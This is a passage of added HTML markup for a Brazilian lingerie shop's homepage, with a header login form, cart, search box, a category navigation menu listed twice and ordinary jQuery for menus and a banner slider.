+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    Você precisa ter JavaScript habilitado em seu navegador para utilizar as funcionalidades deste website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        <div class="header-mfix"></div>
+<header class="header">
+    <div class="header-upper">
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-12">
+                    <ul>
+                        <li class="hidden-xs"><span class="ico-frete"></span><strong>frete grátis</strong> acima de R$ 200</li>
+                        <li class="hidden-xs"><span class="ico-desconto"></span><strong>de desconto</strong> no depósito</li>
+                        <li class="hidden-xs"><span class="ico-parcela"></span><strong>sem juros</strong> no crédito</li>
+                        <li class="hidden-xs hidden-sm"><span class="ico-envio"></span><strong>embalagem</strong> discreta</li>
+                        <li class="exibeTel"><span class="ico-tel"></span>atendimento <strong>+ 55 (22) 2533.5719</strong></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-2">
+                <div class="logo">
+                    <a href="http://sensualle.com.br/" title="Icoz Commerce"><img class="img-responsive" src="http://sensualle.com.br/skin/frontend/default/icoz/images/logo.png" alt="Icoz Commerce" /></a>
+                </div>
+            </div>
+            <div class="col-xs-12 col-sm-9 col-md-7">
+                <div class="links-cabecalho">
+                    <div class="h-btns">
+                        <div class="box boxlogin">
+                                                    <ul class="logged-out">
+                                <li class="loginlink">Olá, <h3><a href="#">Visitante</a></h3></li>
+                            </ul>
+                                                </div>
+                        <div class="header-account-login">
+    <form action="http://sensualle.com.br/customer/account/loginPost/" method="post" id="header-login-form">
+        <ul class="form-list">
+            <li>
+                <label for="email" class="required"><em>*</em>Endereço de e-mail</label>
+                <div class="input-box">
+                    <input type="text" name="login[username]" value="" id="email" class="input-text required-entry validate-email" title="Endereço de e-mail" />
+                </div>
+            </li>
+            <li>
+                <label for="pass" class="required"><em>*</em>Senha</label>
+                <a href="http://sensualle.com.br/customer/account/forgotpassword/" class="f-right">Esqueceu?</a>
+                <div class="input-box">
+                    <input type="password" name="login[password]" class="input-text required-entry validate-password" id="pass" title="Senha" />
+                </div>
+            </li>
+        </ul>
+        <button type="button" title="Cadastrar" class="button" onclick="window.location='http://sensualle.com.br/customer/account/create/';"><span><span>Cadastrar</span></span></button>
+        <button type="submit" class="button" title="Entrar" name="send" id="send2"><span><span>Entrar</span></span></button>
+    </form>
+    <script type="text/javascript">
+    //<![CDATA[
+        var dataForm = new VarienForm('header-login-form', true);
+    //]]>
+    </script>
+    <div class="inchoo-socialconnect-login">
+                </div>
+</div>
+
+
+
+                    </div>
+                    <div class="h-btns hidden-xs">
+                        <div class="box">
+                            <ul>
+                                <li class="help">Precisa de ajuda?</li>
+                            </ul>
+                        </div>
+                        <div><span style="font-size: 14.039999961853px;"><strong><br /></strong></span></div>
+<ul class="linkbox">
+<li>
+<h3><a href="http://sensualle.com.br/quem-somos">Quem Somos?</a></h3>
+</li>
+<li>
+<h3><a href="http://sensualle.com.br/central-de-atendimento">Central de Atendimento</a></h3>
+</li>
+<li>
+<h3><a title="Loja Virtual" href="http://lojasensualle.com.br/">Loja Virtual</a></h3>
+</li>
+</ul>                    </div>
+                    <div class="h-btns">
+                        <div class="box">
+                            <ul>
+                                <li><a href="http://lojasensualle.com.br" style="text-decoration:none;color:#fff;">Loja Virtual</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="box header-cart" id="header-cart">
+    <div class="head">
+        <span class="ico-sacola"></span>
+        <p>Minha sacola</p>
+        <strong><span class="price">R$0,00</span></strong>
+    </div>
+    <div class="content" id="cart-content" style="display: none;opacity:0;">
+            <div class="inner-cart-img"></div>
+        <h6>Seu carrinho está vazio.</h6>
+     
+                </div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+    jQuery('#header-cart').mouseenter(function() {
+        jQuery('#cart-content').css('display','block');
+        jQuery('#cart-content').stop().fadeTo(200, 1);
+    });
+
+    jQuery('#header-cart').mouseleave(function() {
+        jQuery('#cart-content').stop().fadeTo(200, 0, function() {
+            jQuery('#cart-content').css('display','none');
+        });
+    });
+//]]>
+</script>                </div>
+            </div>
+            <div class="col-xs-12 col-sm-3 col-md-3">
+                <form id="search_mini_form" action="http://sensualle.com.br/catalogsearch/result/" method="get">
+    <fieldset>
+        <label for="search">Buscar:</label>
+        <div class="mini-search">
+            <input id="search" type="text" class="search-input" name="q" value="" placeholder="O que deseja encontrar?" maxlength="128" />
+            <div class="search_btn">
+                <input name="Submit" type="submit" value="Buscar" />
+            </div>
+            <div id="search_autocomplete" class="search-autocomplete"></div>
+            <script type="text/javascript">
+            //<![CDATA[
+                var searchForm = new Varien.searchForm('search_mini_form', 'search', 'O que deseja encontrar?');
+                searchForm.initAutocomplete('http://sensualle.com.br/catalogsearch/ajax/suggest/', 'search_autocomplete');
+            //]]>
+            </script>
+        </div>
+    </fieldset>
+</form>
+            </div>
+        </div>
+    </div>
+</header>
+<nav class="nav-container">
+    <ul id="nav">
+        <li id="nav-shop-by-all" class="level0">
+            <a href="#" class="level0 has-children">
+                <span>Todas as Categorias</span>
+                <span class="all-categories-icon"></span>
+            </a>
+            <ul id="nav-shop-by-all-ul" class="level0"><li class="level0 nav-1 level-top first parent">
+<a href="http://sensualle.com.br/colecoes.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/colecoes.png" alt="Coleções" /></span><span class="category-name">Coleções</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-1-1 first">
+<a href="http://sensualle.com.br/colecoes/a-onca-comeu.html">
+<span class="category-empty-icon"></span><span class="category-name">A Onça Comeu</span>
+</a>
+</li><li class="level1 nav-1-2">
+<a href="http://sensualle.com.br/colecoes/best-sellers.html">
+<span class="category-empty-icon"></span><span class="category-name">Best Sellers</span>
+</a>
+</li><li class="level1 nav-1-3">
+<a href="http://sensualle.com.br/colecoes/cu-doce.html">
+<span class="category-empty-icon"></span><span class="category-name">Cu Doce</span>
+</a>
+</li><li class="level1 nav-1-4">
+<a href="http://sensualle.com.br/colecoes/desata-me.html">
+<span class="category-empty-icon"></span><span class="category-name">Desata-me</span>
+</a>
+</li><li class="level1 nav-1-5">
+<a href="http://sensualle.com.br/colecoes/e-dando-que-se-recebe.html">
+<span class="category-empty-icon"></span><span class="category-name">É Dando que se Recebe</span>
+</a>
+</li><li class="level1 nav-1-6">
+<a href="http://sensualle.com.br/colecoes/fica-comigo-esta-noite.html">
+<span class="category-empty-icon"></span><span class="category-name">Fica Comigo Esta Noite</span>
+</a>
+</li><li class="level1 nav-1-7">
+<a href="http://sensualle.com.br/colecoes/ferro-na-boneca.html">
+<span class="category-empty-icon"></span><span class="category-name">Ferro na Boneca</span>
+</a>
+</li><li class="level1 nav-1-8">
+<a href="http://sensualle.com.br/colecoes/hoje-quero-ser-tua.html">
+<span class="category-empty-icon"></span><span class="category-name">Hoje Quero Ser Tua</span>
+</a>
+</li><li class="level1 nav-1-9">
+<a href="http://sensualle.com.br/colecoes/mes-que-vem-eu-volto.html">
+<span class="category-empty-icon"></span><span class="category-name">Mês Que Vem Eu Volto</span>
+</a>
+</li><li class="level1 nav-1-10">
+<a href="http://sensualle.com.br/colecoes/me-engana-que-eu-gosto.html">
+<span class="category-empty-icon"></span><span class="category-name">Me Engana que Eu Gosto...</span>
+</a>
+</li><li class="level1 nav-1-11">
+<a href="http://sensualle.com.br/colecoes/mulher-perfeita.html">
+<span class="category-empty-icon"></span><span class="category-name">Mulher Perfeita</span>
+</a>
+</li><li class="level1 nav-1-12">
+<a href="http://sensualle.com.br/colecoes/nem-tudo-que-reluz-e-ouro.html">
+<span class="category-empty-icon"></span><span class="category-name">Nem Tudo que Reluz é Ouro</span>
+</a>
+</li><li class="level1 nav-1-13">
+<a href="http://sensualle.com.br/colecoes/o-amor-e-lindo.html">
+<span class="category-empty-icon"></span><span class="category-name">O Amor é Lindo</span>
+</a>
+</li><li class="level1 nav-1-14">
+<a href="http://sensualle.com.br/colecoes/o-couro-come-e-ninguem-ve.html">
+<span class="category-empty-icon"></span><span class="category-name">O Couro Come e Ninguém Vê</span>
+</a>
+</li><li class="level1 nav-1-15">
+<a href="http://sensualle.com.br/colecoes/os-brutos-tambem-amam.html">
+<span class="category-empty-icon"></span><span class="category-name">Os Brutos Também Amam</span>
+</a>
+</li><li class="level1 nav-1-16">
+<a href="http://sensualle.com.br/colecoes/os-homens-preferem-as-cachorras.html">
+<span class="category-empty-icon"></span><span class="category-name">Os Homens Preferem as Cachorras</span>
+</a>
+</li><li class="level1 nav-1-17">
+<a href="http://sensualle.com.br/colecoes/papai-coracao-tem-pernas.html">
+<span class="category-empty-icon"></span><span class="category-name">Papai, Coração Tem Pernas?</span>
+</a>
+</li><li class="level1 nav-1-18">
+<a href="http://sensualle.com.br/colecoes/santinhas-do-pau-oco.html">
+<span class="category-empty-icon"></span><span class="category-name">Santinhas do Pau Oco</span>
+</a>
+</li><li class="level1 nav-1-19">
+<a href="http://sensualle.com.br/colecoes/se-correr-o-bicho-pega.html">
+<span class="category-empty-icon"></span><span class="category-name">Se Correr o Bicho Pega</span>
+</a>
+</li><li class="level1 nav-1-20">
+<a href="http://sensualle.com.br/colecoes/se-ficar-o-bicho-come.html">
+<span class="category-empty-icon"></span><span class="category-name">Se Ficar o Bicho Come</span>
+</a>
+</li><li class="level1 nav-1-21">
+<a href="http://sensualle.com.br/colecoes/soy-loco-por-ti-sensualle.html">
+<span class="category-empty-icon"></span><span class="category-name">Soy Loco por Ti, Sensualle</span>
+</a>
+</li><li class="level1 nav-1-22">
+<a href="http://sensualle.com.br/colecoes/traga-seu-amor-em-3-dias.html">
+<span class="category-empty-icon"></span><span class="category-name">Traga Seu Amor em 3 dias... (E Submisso)</span>
+</a>
+</li><li class="level1 nav-1-23">
+<a href="http://sensualle.com.br/colecoes/vou-dar-pra-todo-mundo.html">
+<span class="category-empty-icon"></span><span class="category-name">Vou Dar Amor Pra Todo Mundo</span>
+</a>
+</li><li class="level1 nav-1-24 last">
+<a href="http://sensualle.com.br/colecoes/escrava-do-amor.html">
+<span class="category-empty-icon"></span><span class="category-name">Escrava do Amor</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-2 level-top parent">
+<a href="http://sensualle.com.br/tangas.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_24.png" alt="Tangas" /></span><span class="category-name">Tangas</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-2-1 first">
+<a href="http://sensualle.com.br/tangas/basicas.html">
+<span class="category-empty-icon"></span><span class="category-name">Básicas</span>
+</a>
+</li><li class="level1 nav-2-2">
+<a href="http://sensualle.com.br/tangas/sem-costura.html">
+<span class="category-empty-icon"></span><span class="category-name">Sem Costura</span>
+</a>
+</li><li class="level1 nav-2-3">
+<a href="http://sensualle.com.br/tangas/tangas-abertas.html">
+<span class="category-empty-icon"></span><span class="category-name">Abertas</span>
+</a>
+</li><li class="level1 nav-2-4">
+<a href="http://sensualle.com.br/tangas/calecons.html">
+<span class="category-empty-icon"></span><span class="category-name">Caleçons</span>
+</a>
+</li><li class="level1 nav-2-5">
+<a href="http://sensualle.com.br/tangas/tangas-com-biju.html">
+<span class="category-empty-icon"></span><span class="category-name">Com Biju</span>
+</a>
+</li><li class="level1 nav-2-6">
+<a href="http://sensualle.com.br/tangas/em-renda.html">
+<span class="category-empty-icon"></span><span class="category-name">Em Renda</span>
+</a>
+</li><li class="level1 nav-2-7">
+<a href="http://sensualle.com.br/tangas/fio-dental.html">
+<span class="category-empty-icon"></span><span class="category-name">Fio Dental</span>
+</a>
+</li><li class="level1 nav-2-8">
+<a href="http://sensualle.com.br/tangas/string.html">
+<span class="category-empty-icon"></span><span class="category-name">String</span>
+</a>
+</li><li class="level1 nav-2-9">
+<a href="http://sensualle.com.br/tangas/com-regulagem.html">
+<span class="category-empty-icon"></span><span class="category-name">Com Regulagem</span>
+</a>
+</li><li class="level1 nav-2-10">
+<a href="http://sensualle.com.br/tangas/tamanho-g-e-gg.html">
+<span class="category-empty-icon"></span><span class="category-name">Tam. G e GG</span>
+</a>
+</li><li class="level1 nav-2-11 last">
+<a href="http://sensualle.com.br/tangas/animal-print.html">
+<span class="category-empty-icon"></span><span class="category-name">Animal Print</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-3 level-top parent">
+<a href="http://sensualle.com.br/sutias.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_26.png" alt="Sutiãs" /></span><span class="category-name">Sutiãs</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-3-1 first">
+<a href="http://sensualle.com.br/sutias/com-bojo.html">
+<span class="category-empty-icon"></span><span class="category-name">Com Bojo</span>
+</a>
+</li><li class="level1 nav-3-2">
+<a href="http://sensualle.com.br/sutias/sem-bojo.html">
+<span class="category-empty-icon"></span><span class="category-name">Sem Bojo</span>
+</a>
+</li><li class="level1 nav-3-3 last">
+<a href="http://sensualle.com.br/sutias/abertos.html">
+<span class="category-empty-icon"></span><span class="category-name">Abertos</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-4 level-top">
+<a href="http://sensualle.com.br/conjuntos.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_13_copiar.png" alt="Conjuntos" /></span><span class="category-name">Conjuntos</span>
+</a>
+</li><li class="level0 nav-5 level-top parent">
+<a href="http://sensualle.com.br/nightwear.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_05_copiar_1.png" alt="Nightwear" /></span><span class="category-name">Nightwear</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-5-1 first">
+<a href="http://sensualle.com.br/nightwear/camisolas.html">
+<span class="category-empty-icon"></span><span class="category-name">Camisolas</span>
+</a>
+</li><li class="level1 nav-5-2">
+<a href="http://sensualle.com.br/nightwear/baby-dolls.html">
+<span class="category-empty-icon"></span><span class="category-name">Baby Dolls</span>
+</a>
+</li><li class="level1 nav-5-3">
+<a href="http://sensualle.com.br/nightwear/espartilhos.html">
+<span class="category-empty-icon"></span><span class="category-name">Espartilhos</span>
+</a>
+</li><li class="level1 nav-5-4 last">
+<a href="http://sensualle.com.br/nightwear/acessorios.html">
+<span class="category-empty-icon"></span><span class="category-name">Acessórios</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-6 level-top parent">
+<a href="http://sensualle.com.br/bodies-e-macaquinhos.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_03_1.png" alt="Bodies e Macaquinhos" /></span><span class="category-name">Bodies e Macaquinhos</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-6-1 first">
+<a href="http://sensualle.com.br/bodies-e-macaquinhos/body.html">
+<span class="category-empty-icon"></span><span class="category-name">Body</span>
+</a>
+</li><li class="level1 nav-6-2">
+<a href="http://sensualle.com.br/bodies-e-macaquinhos/macacao.html">
+<span class="category-empty-icon"></span><span class="category-name">Macacão</span>
+</a>
+</li><li class="level1 nav-6-3 last">
+<a href="http://sensualle.com.br/bodies-e-macaquinhos/macaquinho.html">
+<span class="category-empty-icon"></span><span class="category-name">Macaquinho</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-7 level-top">
+<a href="http://sensualle.com.br/vestidos.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_10_copiar.png" alt="Vestido Sexy" /></span><span class="category-name">Vestido Sexy</span>
+</a>
+</li><li class="level0 nav-8 level-top">
+<a href="http://sensualle.com.br/cuecas.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_21.png" alt="Para Eles" /></span><span class="category-name">Para Eles</span>
+</a>
+</li><li class="level0 nav-9 level-top last">
+<a href="http://sensualle.com.br/lancamentos.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_16.png" alt="Lançamentos" /></span><span class="category-name">Lançamentos</span>
+</a>
+</li></ul>
+        </li>
+        <li class="level0 nav-1 level-top first parent">
+<a href="http://sensualle.com.br/colecoes.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/colecoes.png" alt="Coleções" /></span><span class="category-name">Coleções</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-1-1 first">
+<a href="http://sensualle.com.br/colecoes/a-onca-comeu.html">
+<span class="category-empty-icon"></span><span class="category-name">A Onça Comeu</span>
+</a>
+</li><li class="level1 nav-1-2">
+<a href="http://sensualle.com.br/colecoes/best-sellers.html">
+<span class="category-empty-icon"></span><span class="category-name">Best Sellers</span>
+</a>
+</li><li class="level1 nav-1-3">
+<a href="http://sensualle.com.br/colecoes/cu-doce.html">
+<span class="category-empty-icon"></span><span class="category-name">Cu Doce</span>
+</a>
+</li><li class="level1 nav-1-4">
+<a href="http://sensualle.com.br/colecoes/desata-me.html">
+<span class="category-empty-icon"></span><span class="category-name">Desata-me</span>
+</a>
+</li><li class="level1 nav-1-5">
+<a href="http://sensualle.com.br/colecoes/e-dando-que-se-recebe.html">
+<span class="category-empty-icon"></span><span class="category-name">É Dando que se Recebe</span>
+</a>
+</li><li class="level1 nav-1-6">
+<a href="http://sensualle.com.br/colecoes/fica-comigo-esta-noite.html">
+<span class="category-empty-icon"></span><span class="category-name">Fica Comigo Esta Noite</span>
+</a>
+</li><li class="level1 nav-1-7">
+<a href="http://sensualle.com.br/colecoes/ferro-na-boneca.html">
+<span class="category-empty-icon"></span><span class="category-name">Ferro na Boneca</span>
+</a>
+</li><li class="level1 nav-1-8">
+<a href="http://sensualle.com.br/colecoes/hoje-quero-ser-tua.html">
+<span class="category-empty-icon"></span><span class="category-name">Hoje Quero Ser Tua</span>
+</a>
+</li><li class="level1 nav-1-9">
+<a href="http://sensualle.com.br/colecoes/mes-que-vem-eu-volto.html">
+<span class="category-empty-icon"></span><span class="category-name">Mês Que Vem Eu Volto</span>
+</a>
+</li><li class="level1 nav-1-10">
+<a href="http://sensualle.com.br/colecoes/me-engana-que-eu-gosto.html">
+<span class="category-empty-icon"></span><span class="category-name">Me Engana que Eu Gosto...</span>
+</a>
+</li><li class="level1 nav-1-11">
+<a href="http://sensualle.com.br/colecoes/mulher-perfeita.html">
+<span class="category-empty-icon"></span><span class="category-name">Mulher Perfeita</span>
+</a>
+</li><li class="level1 nav-1-12">
+<a href="http://sensualle.com.br/colecoes/nem-tudo-que-reluz-e-ouro.html">
+<span class="category-empty-icon"></span><span class="category-name">Nem Tudo que Reluz é Ouro</span>
+</a>
+</li><li class="level1 nav-1-13">
+<a href="http://sensualle.com.br/colecoes/o-amor-e-lindo.html">
+<span class="category-empty-icon"></span><span class="category-name">O Amor é Lindo</span>
+</a>
+</li><li class="level1 nav-1-14">
+<a href="http://sensualle.com.br/colecoes/o-couro-come-e-ninguem-ve.html">
+<span class="category-empty-icon"></span><span class="category-name">O Couro Come e Ninguém Vê</span>
+</a>
+</li><li class="level1 nav-1-15">
+<a href="http://sensualle.com.br/colecoes/os-brutos-tambem-amam.html">
+<span class="category-empty-icon"></span><span class="category-name">Os Brutos Também Amam</span>
+</a>
+</li><li class="level1 nav-1-16">
+<a href="http://sensualle.com.br/colecoes/os-homens-preferem-as-cachorras.html">
+<span class="category-empty-icon"></span><span class="category-name">Os Homens Preferem as Cachorras</span>
+</a>
+</li><li class="level1 nav-1-17">
+<a href="http://sensualle.com.br/colecoes/papai-coracao-tem-pernas.html">
+<span class="category-empty-icon"></span><span class="category-name">Papai, Coração Tem Pernas?</span>
+</a>
+</li><li class="level1 nav-1-18">
+<a href="http://sensualle.com.br/colecoes/santinhas-do-pau-oco.html">
+<span class="category-empty-icon"></span><span class="category-name">Santinhas do Pau Oco</span>
+</a>
+</li><li class="level1 nav-1-19">
+<a href="http://sensualle.com.br/colecoes/se-correr-o-bicho-pega.html">
+<span class="category-empty-icon"></span><span class="category-name">Se Correr o Bicho Pega</span>
+</a>
+</li><li class="level1 nav-1-20">
+<a href="http://sensualle.com.br/colecoes/se-ficar-o-bicho-come.html">
+<span class="category-empty-icon"></span><span class="category-name">Se Ficar o Bicho Come</span>
+</a>
+</li><li class="level1 nav-1-21">
+<a href="http://sensualle.com.br/colecoes/soy-loco-por-ti-sensualle.html">
+<span class="category-empty-icon"></span><span class="category-name">Soy Loco por Ti, Sensualle</span>
+</a>
+</li><li class="level1 nav-1-22">
+<a href="http://sensualle.com.br/colecoes/traga-seu-amor-em-3-dias.html">
+<span class="category-empty-icon"></span><span class="category-name">Traga Seu Amor em 3 dias... (E Submisso)</span>
+</a>
+</li><li class="level1 nav-1-23">
+<a href="http://sensualle.com.br/colecoes/vou-dar-pra-todo-mundo.html">
+<span class="category-empty-icon"></span><span class="category-name">Vou Dar Amor Pra Todo Mundo</span>
+</a>
+</li><li class="level1 nav-1-24 last">
+<a href="http://sensualle.com.br/colecoes/escrava-do-amor.html">
+<span class="category-empty-icon"></span><span class="category-name">Escrava do Amor</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-2 level-top parent">
+<a href="http://sensualle.com.br/tangas.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_24.png" alt="Tangas" /></span><span class="category-name">Tangas</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-2-1 first">
+<a href="http://sensualle.com.br/tangas/basicas.html">
+<span class="category-empty-icon"></span><span class="category-name">Básicas</span>
+</a>
+</li><li class="level1 nav-2-2">
+<a href="http://sensualle.com.br/tangas/sem-costura.html">
+<span class="category-empty-icon"></span><span class="category-name">Sem Costura</span>
+</a>
+</li><li class="level1 nav-2-3">
+<a href="http://sensualle.com.br/tangas/tangas-abertas.html">
+<span class="category-empty-icon"></span><span class="category-name">Abertas</span>
+</a>
+</li><li class="level1 nav-2-4">
+<a href="http://sensualle.com.br/tangas/calecons.html">
+<span class="category-empty-icon"></span><span class="category-name">Caleçons</span>
+</a>
+</li><li class="level1 nav-2-5">
+<a href="http://sensualle.com.br/tangas/tangas-com-biju.html">
+<span class="category-empty-icon"></span><span class="category-name">Com Biju</span>
+</a>
+</li><li class="level1 nav-2-6">
+<a href="http://sensualle.com.br/tangas/em-renda.html">
+<span class="category-empty-icon"></span><span class="category-name">Em Renda</span>
+</a>
+</li><li class="level1 nav-2-7">
+<a href="http://sensualle.com.br/tangas/fio-dental.html">
+<span class="category-empty-icon"></span><span class="category-name">Fio Dental</span>
+</a>
+</li><li class="level1 nav-2-8">
+<a href="http://sensualle.com.br/tangas/string.html">
+<span class="category-empty-icon"></span><span class="category-name">String</span>
+</a>
+</li><li class="level1 nav-2-9">
+<a href="http://sensualle.com.br/tangas/com-regulagem.html">
+<span class="category-empty-icon"></span><span class="category-name">Com Regulagem</span>
+</a>
+</li><li class="level1 nav-2-10">
+<a href="http://sensualle.com.br/tangas/tamanho-g-e-gg.html">
+<span class="category-empty-icon"></span><span class="category-name">Tam. G e GG</span>
+</a>
+</li><li class="level1 nav-2-11 last">
+<a href="http://sensualle.com.br/tangas/animal-print.html">
+<span class="category-empty-icon"></span><span class="category-name">Animal Print</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-3 level-top parent">
+<a href="http://sensualle.com.br/sutias.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_26.png" alt="Sutiãs" /></span><span class="category-name">Sutiãs</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-3-1 first">
+<a href="http://sensualle.com.br/sutias/com-bojo.html">
+<span class="category-empty-icon"></span><span class="category-name">Com Bojo</span>
+</a>
+</li><li class="level1 nav-3-2">
+<a href="http://sensualle.com.br/sutias/sem-bojo.html">
+<span class="category-empty-icon"></span><span class="category-name">Sem Bojo</span>
+</a>
+</li><li class="level1 nav-3-3 last">
+<a href="http://sensualle.com.br/sutias/abertos.html">
+<span class="category-empty-icon"></span><span class="category-name">Abertos</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-4 level-top">
+<a href="http://sensualle.com.br/conjuntos.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_13_copiar.png" alt="Conjuntos" /></span><span class="category-name">Conjuntos</span>
+</a>
+</li><li class="level0 nav-5 level-top parent">
+<a href="http://sensualle.com.br/nightwear.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_05_copiar_1.png" alt="Nightwear" /></span><span class="category-name">Nightwear</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-5-1 first">
+<a href="http://sensualle.com.br/nightwear/camisolas.html">
+<span class="category-empty-icon"></span><span class="category-name">Camisolas</span>
+</a>
+</li><li class="level1 nav-5-2">
+<a href="http://sensualle.com.br/nightwear/baby-dolls.html">
+<span class="category-empty-icon"></span><span class="category-name">Baby Dolls</span>
+</a>
+</li><li class="level1 nav-5-3">
+<a href="http://sensualle.com.br/nightwear/espartilhos.html">
+<span class="category-empty-icon"></span><span class="category-name">Espartilhos</span>
+</a>
+</li><li class="level1 nav-5-4 last">
+<a href="http://sensualle.com.br/nightwear/acessorios.html">
+<span class="category-empty-icon"></span><span class="category-name">Acessórios</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-6 level-top parent">
+<a href="http://sensualle.com.br/bodies-e-macaquinhos.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_03_1.png" alt="Bodies e Macaquinhos" /></span><span class="category-name">Bodies e Macaquinhos</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-6-1 first">
+<a href="http://sensualle.com.br/bodies-e-macaquinhos/body.html">
+<span class="category-empty-icon"></span><span class="category-name">Body</span>
+</a>
+</li><li class="level1 nav-6-2">
+<a href="http://sensualle.com.br/bodies-e-macaquinhos/macacao.html">
+<span class="category-empty-icon"></span><span class="category-name">Macacão</span>
+</a>
+</li><li class="level1 nav-6-3 last">
+<a href="http://sensualle.com.br/bodies-e-macaquinhos/macaquinho.html">
+<span class="category-empty-icon"></span><span class="category-name">Macaquinho</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-7 level-top">
+<a href="http://sensualle.com.br/vestidos.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_10_copiar.png" alt="Vestido Sexy" /></span><span class="category-name">Vestido Sexy</span>
+</a>
+</li><li class="level0 nav-8 level-top">
+<a href="http://sensualle.com.br/cuecas.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_21.png" alt="Para Eles" /></span><span class="category-name">Para Eles</span>
+</a>
+</li><li class="level0 nav-9 level-top last">
+<a href="http://sensualle.com.br/lancamentos.html" class="level-top">
+<span class="category-icon"><img src="http://sensualle.com.br/media/catalog/category/layout-sensualle_16.png" alt="Lançamentos" /></span><span class="category-name">Lançamentos</span>
+</a>
+</li>    </ul>
+</nav>
+<script type="text/javascript">
+//<![CDATA[
+
+var shopByAllUl = jQuery("#nav-shop-by-all-ul");
+var nav = jQuery("#nav");
+shopByAllUl.width(nav.width());
+jQuery(window).resize(function() {
+    shopByAllUl.width(nav.width() - 2);
+});
+
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+
+var position   = jQuery(window).scrollTop();
+var header     = jQuery('.header:first');
+var navigation = jQuery('.nav-container:first');
+var upOnce     = false;
+
+jQuery(window).scroll(function() {
+    var current = jQuery(window).scrollTop();
+
+    if (!navigation.hasClass('floating-nav') && header.offset().top + header.height() >= navigation.offset().top + navigation.height()) {
+        navigation.addClass('floating-nav');
+        header.addClass('header-scroll');
+    }
+
+    if (current == 0) {
+        navigation.removeClass('floating-nav');
+        navigation.removeClass('nav-visivel');
+        navigation.removeClass('nav-oculto');
+        header.removeClass('header-scroll');
+        upOnce = false;
+    }
+
+    if (navigation.hasClass('floating-nav')) {
+        if (current > position) {
+            navigation.removeClass('nav-visivel');
+            if (upOnce) {
+                navigation.addClass('nav-oculto');
+            }
+        } else if (current < position) {
+            navigation.removeClass('nav-oculto');
+            navigation.addClass('nav-visivel');
+            upOnce = true;
+        }
+    }
+    position = current;
+});
+
+header.mouseenter(function() {
+    if (navigation.hasClass('floating-nav')) {
+        navigation.removeClass('nav-oculto');
+        navigation.addClass('nav-visivel');
+    }
+});
+
+navigation.mouseleave(function(e) {
+    if (navigation.hasClass('floating-nav')) {
+        if (e.pageY >= navigation.offset().top + navigation.outerHeight()) {
+            navigation.removeClass('nav-visivel');
+            navigation.addClass('nav-oculto');
+        }
+    }
+});
+
+//]]>
+</script>
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-12">
+                                    </div>
+            </div>
+            <div class="row">
+                <div class="col-xs-12">
+                                    </div>
+            </div>
+            <div class="row">
+                <div class="col-xs-12">
+                    <div class="std"><p><div id="banner-slider-outer-wrapper" style="max-width:1140px;">
+    <div class="jcarousel" style="max-width:1140px;max-height:460px;">
+        <ul>
+                                                        <li><a href="http://sensualle.com.br/colecoes/escrava-do-amor.html"><img class="img-responsive" src="http://sensualle.com.br/media/banner/image/b/a/banner-1.16_3.jpg" width="1140" height="460" alt="Full Banner" /></a></li>
+                            </ul>
+    </div>
+    <a href="#" class="jcarousel-control-prev" style="top:185px;">&lsaquo;</a>
+    <a href="#" class="jcarousel-control-next" style="top:185px;">&rsaquo;</a>
+    <p class="jcarousel-pagination">
+    </p>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+(function($) {
+    $(function() {
+
+        bannerSlider = $('#banner-slider-outer-wrapper .jcarousel');
